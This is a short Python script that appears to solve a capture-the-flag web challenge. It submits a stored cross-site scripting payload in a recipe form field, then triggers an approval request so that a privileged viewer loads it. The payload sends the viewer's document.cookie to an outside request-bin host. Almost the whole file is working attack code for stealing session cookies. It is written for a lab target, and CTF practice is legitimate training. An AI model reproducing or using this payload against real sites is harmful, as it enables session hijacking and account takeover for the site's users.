import requests
import re




payload = '<script>document.location="https://postb.in/1589057416057-1402036985382?hello="+document.cookie</script>'

data = {"name": "blarg",
        "ingredients": payload}

url = "http://challenge.acictf.com:45101"

# create a session with the website
s = requests.Session()
r = s.get(url)

# create recipe with our payload in the data
response = s.post(url + '/cookie/new', data=data)

print(response.status_code)
# get cookie id
# cookie_id = re.match('session=([a-z\\d\\-]+)', response.headers['Set-Cookie']).group(1)
# get cookie id from page, not the Set-Cookie header
# print(response.content.decode())
cookie_id = re.findall('name="cookie" value=".*"', response.content.decode())[0].split('value="')[1][:-1]
print(cookie_id)




r = s.post(url + '/approve', data={"cookie": cookie_id})
print(r.url)
print(r.status_code)
print(r.content)
